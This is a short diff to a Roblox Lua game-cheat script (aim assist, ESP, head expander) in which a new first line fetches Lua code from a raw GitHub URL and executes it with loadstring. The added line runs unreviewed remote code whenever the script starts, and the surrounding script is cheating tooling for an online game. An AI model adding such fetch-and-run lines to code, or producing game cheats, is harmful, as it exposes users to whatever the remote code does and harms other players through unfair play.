@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PS99ADRISCRIPTER/Apocalypse-Rising-2/main/main.lua"))()
+
 -- Ultimate Cheat Suite UI with Aim Assist, Visuals (ESP) and Head Expander
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
